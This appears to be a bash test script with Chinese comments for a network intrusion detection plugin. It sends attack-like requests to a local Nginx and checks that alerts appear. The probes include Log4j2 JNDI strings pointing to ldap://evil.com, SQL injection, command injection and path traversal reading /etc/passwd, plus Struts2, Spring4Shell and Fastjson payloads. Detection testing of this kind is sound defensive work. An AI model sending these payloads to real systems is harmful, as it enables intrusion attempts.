#!/bin/bash
#
# NIDS 网络攻击检测测试脚本
# 用于触发 nids 插件的网络入侵检测告警
#
# 前置条件：
#   1. Nginx 在 80 端口运行：sudo systemctl start nginx
#   2. nids.yaml 中 interface 配置为 "lo"
#
# 使用前请先在另一个终端启动 Agent：
#   cd /opt/cloudsec
#   sudo ./bin/agent -standalone -plugins=nids -output=stderr -test
#
# 然后在当前终端执行本脚本：
#   bash scripts/test-nids.sh
#

INTERVAL=1  # 每个测试用例之间的等待秒数
LOG_FILE="/opt/cloudsec/agent/logs/plugins/nids/nids.log"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

TOTAL=12
PASS=0
FAIL=0

echo "========================================"
echo " NIDS 网络攻击检测 — 自动化测试"
echo "========================================"
echo ""

# ------------------------------------------
# 前置检查
# ------------------------------------------
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}错误：本脚本需要 root 权限运行${NC}"
    echo "  用法: sudo bash $0"
    exit 1
fi

echo -e "${CYAN}[前置检查]${NC}"

# 检查 Nginx
if ! curl -s -o /dev/null -w "" http://127.0.0.1/ 2>/dev/null; then
    echo -e "  ${RED}Nginx 未在 80 端口运行，请先启动：sudo systemctl start nginx${NC}"
    exit 1
fi
echo -e "  ${GREEN}Nginx 正常运行${NC}"

# 检查 nids 日志文件
if [ ! -f "$LOG_FILE" ]; then
    echo -e "  ${RED}NIDS 日志文件不存在：${LOG_FILE}${NC}"
    echo -e "  ${RED}请确认 Agent 已启动且 nids 插件已加载${NC}"
    exit 1
fi
echo -e "  ${GREEN}NIDS 日志文件存在${NC}"

# 记录测试开始前的日志行数
LOG_LINES_BEFORE=$(wc -l < "$LOG_FILE")

echo ""
echo "请确认 Agent 已在另一个终端启动"
echo "每个测试用例间隔 ${INTERVAL} 秒"
echo ""

# check_alert 函数：检查日志中是否出现指定 SID 的告警
# 参数：$1=SID  $2=测试编号
check_alert() {
    local sid=$1
    local test_num=$2
    sleep "$INTERVAL"
    if tail -n +$((LOG_LINES_BEFORE + 1)) "$LOG_FILE" | grep -q "\"sid\": ${sid}"; then
        echo -e "  ${GREEN}=> 检测到 SID ${sid} 告警 ✓${NC}"
        PASS=$((PASS + 1))
    else
        echo -e "  ${RED}=> 未检测到 SID ${sid} 告警 ✗${NC}"
        FAIL=$((FAIL + 1))
    fi
}

# ------------------------------------------
# Test 1: SID 1001 - Log4j2 JNDI Header (critical)
# ------------------------------------------
echo -e "${YELLOW}[1/${TOTAL}] SID 1001: Log4j2 JNDI 注入 — Header（critical）${NC}"
echo "  执行: curl -H 'X-Api-Version: \${jndi:ldap://evil.com/a}' http://127.0.0.1/"
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/a}' http://127.0.0.1/
check_alert 1001 1

# ------------------------------------------
# Test 2: SID 1002 - Log4j2 JNDI URI (critical)
# ------------------------------------------
echo -e "${YELLOW}[2/${TOTAL}] SID 1002: Log4j2 JNDI 注入 — URI（critical）${NC}"
echo '  执行: curl -g --path-as-is http://127.0.0.1/${jndi:ldap://evil.com/a}'
curl -s -o /dev/null -g --path-as-is 'http://127.0.0.1/${jndi:ldap://evil.com/a}'
check_alert 1002 2

# ------------------------------------------
# Test 3: SID 2001 - SQL Injection UNION SELECT (high)
# ------------------------------------------
echo -e "${YELLOW}[3/${TOTAL}] SID 2001: SQL 注入 — UNION SELECT（high）${NC}"
echo "  执行: curl 'http://127.0.0.1/api?id=1%20UNION%20SELECT%201,2,3'"
curl -s -o /dev/null 'http://127.0.0.1/api?id=1%20UNION%20SELECT%201,2,3'
check_alert 2001 3

# ------------------------------------------
# Test 4: SID 3001 - Command Injection (critical)
# ------------------------------------------
echo -e "${YELLOW}[4/${TOTAL}] SID 3001: 命令注入（critical）${NC}"
echo "  执行: curl 'http://127.0.0.1/api?cmd=%3bcat%20/etc/passwd'"
curl -s -o /dev/null 'http://127.0.0.1/api?cmd=%3bcat%20/etc/passwd'
check_alert 3001 4

# ------------------------------------------
# Test 5: SID 4001 - Path Traversal etc/passwd (high)
# ------------------------------------------
echo -e "${YELLOW}[5/${TOTAL}] SID 4001: 路径遍历 — etc/passwd（high）${NC}"
echo "  执行: curl --path-as-is 'http://127.0.0.1/../../../../etc/passwd'"
curl -s -o /dev/null --path-as-is 'http://127.0.0.1/../../../../etc/passwd'
check_alert 4001 5

# ------------------------------------------
# Test 6: SID 4003 - Deep Path Traversal (high)
# ------------------------------------------
echo -e "${YELLOW}[6/${TOTAL}] SID 4003: 路径遍历 — 深层遍历（high）${NC}"
echo "  （与上一条同时触发）"
# 已在上一条请求中触发，直接检查
if tail -n +$((LOG_LINES_BEFORE + 1)) "$LOG_FILE" | grep -q "\"sid\": 4003"; then
    echo -e "  ${GREEN}=> 检测到 SID 4003 告警 ✓${NC}"
    PASS=$((PASS + 1))
else
    echo -e "  ${RED}=> 未检测到 SID 4003 告警 ✗${NC}"
    FAIL=$((FAIL + 1))
fi

# ------------------------------------------
# Test 7: SID 5001 - Struts2 OGNL (critical)
# ------------------------------------------
echo -e "${YELLOW}[7/${TOTAL}] SID 5001: Struts2 OGNL 注入（critical）${NC}"
echo "  执行: curl --path-as-is 'http://127.0.0.1/test%25%7B1+1%7D'"
curl -s -o /dev/null --path-as-is 'http://127.0.0.1/test%25%7B1+1%7D'
check_alert 5001 7

# ------------------------------------------
# Test 8: SID 5002 - Spring4Shell Body (critical)
# ------------------------------------------
echo -e "${YELLOW}[8/${TOTAL}] SID 5002: Spring4Shell — Body（critical）${NC}"
echo "  执行: curl -X POST -d 'class.module.classLoader.resources=test' http://127.0.0.1/"
curl -s -o /dev/null -X POST -d 'class.module.classLoader.resources=test' http://127.0.0.1/
check_alert 5002 8

# ------------------------------------------
# Test 9: SID 5003 - Fastjson RCE Body (critical)
# ------------------------------------------
echo -e "${YELLOW}[9/${TOTAL}] SID 5003: Fastjson RCE — Body（critical）${NC}"
echo '  执行: curl -X POST -H "Content-Type: application/json" -d {"@type":"com.sun.rowset.JdbcRowSetImpl"}'
curl -s -o /dev/null -X POST \
    -H 'Content-Type: application/json' \
    -d '{"@type":"com.sun.rowset.JdbcRowSetImpl"}' \
    http://127.0.0.1/
check_alert 5003 9

# ------------------------------------------
# Test 10: SID 6001 - SQLMap User-Agent (medium)
# ------------------------------------------
echo -e "${YELLOW}[10/${TOTAL}] SID 6001: 扫描器检测 — SQLMap UA（medium）${NC}"
echo "  执行: curl -A 'sqlmap/1.0' http://127.0.0.1/"
curl -s -o /dev/null -A 'sqlmap/1.0' http://127.0.0.1/
check_alert 6001 10

# ------------------------------------------
# Test 11: SID 6002 - Nmap User-Agent (medium)
# ------------------------------------------
echo -e "${YELLOW}[11/${TOTAL}] SID 6002: 扫描器检测 — Nmap UA（medium）${NC}"
echo "  执行: curl -A 'nmap scripting engine' http://127.0.0.1/"
curl -s -o /dev/null -A 'nmap scripting engine' http://127.0.0.1/
check_alert 6002 11

# ------------------------------------------
# Test 12: 重复攻击计数验证
# ------------------------------------------
echo -e "${YELLOW}[12/${TOTAL}] 重复攻击计数验证${NC}"
echo "  执行: 连续 3 次 Log4j2 JNDI Header 攻击"
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/repeat1}' http://127.0.0.1/
sleep 0.5
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/repeat2}' http://127.0.0.1/
sleep 0.5
curl -s -o /dev/null -H 'X-Api-Version: ${jndi:ldap://evil.com/repeat3}' http://127.0.0.1/
sleep "$INTERVAL"

# 检查 count 是否递增（至少出现 count >= 2 的记录）
LAST_COUNT=$(tail -n +$((LOG_LINES_BEFORE + 1)) "$LOG_FILE" | grep "\"sid\": 1001" | tail -1 | grep -o '"count": [0-9]*' | grep -o '[0-9]*')
if [ -n "$LAST_COUNT" ] && [ "$LAST_COUNT" -ge 2 ]; then
    echo -e "  ${GREEN}=> 攻击计数递增正常（最后 count=${LAST_COUNT}） ✓${NC}"
    PASS=$((PASS + 1))
else
    echo -e "  ${RED}=> 攻击计数未正确递增（count=${LAST_COUNT:-未找到}） ✗${NC}"
    FAIL=$((FAIL + 1))
fi

# ------------------------------------------
# 汇总
# ------------------------------------------
echo ""
echo "========================================"
echo " 测试完成"
echo "========================================"
echo ""
echo -e "  总计: ${TOTAL}  通过: ${GREEN}${PASS}${NC}  失败: ${RED}${FAIL}${NC}"
echo ""

if [ "$FAIL" -eq 0 ]; then
    echo -e "${GREEN}所有测试通过！${NC}"
else
    echo -e "${RED}有 ${FAIL} 个测试未通过，请检查日志：${LOG_FILE}${NC}"
fi
echo ""
echo "告警详情："
echo ""
tail -n +$((LOG_LINES_BEFORE + 1)) "$LOG_FILE" | grep "Attack detected"
